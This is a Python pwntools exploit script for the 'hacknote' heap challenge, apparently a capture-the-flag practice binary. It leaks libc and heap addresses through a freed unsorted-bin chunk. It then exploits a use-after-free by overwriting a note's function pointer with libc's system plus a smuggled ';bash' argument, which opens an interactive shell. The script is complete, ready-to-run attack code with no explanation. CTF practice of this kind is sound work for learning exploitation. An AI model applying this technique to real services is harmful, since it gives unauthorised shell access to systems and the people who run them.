#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hacknote_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x08048923
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_note(size, data):
    io.sendlineafter(b":", b"1")
    io.sendafter(b":", str(size).encode())
    io.sendafter(b":", data)

def delete_note(idx):
    io.sendlineafter(b":", b"2")
    io.sendafter(b":", str(idx).encode())

def print_note(idx):
    io.sendlineafter(b":", b"3")
    io.sendafter(b":", str(idx).encode())


def solve():

    add_note(0x500, b"unsorted")
    add_note(0x10, b"chunk")
    delete_note(0)

    add_note(0x50, b"A"*4)
    print_note(2)
    io.recvuntil(b"A"*4)
    leak = io.recv(12)
    main_arena = u32(leak[:4])
    heap_base = u32(leak[4:8]) - 0x10
    libc.address = main_arena - 0x1b0a08
    info("libc base: %#x", libc.address)
    info("heap base: %#x", heap_base)

    for i in range(2):
        delete_note(i)

    heap_addr = heap_base + 0x530
    payload = p32(libc.sym["system"]) + b";bash"

    add_note(0x9, payload)
    add_note(0x10, b"pewpew!")
    print_note(0)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
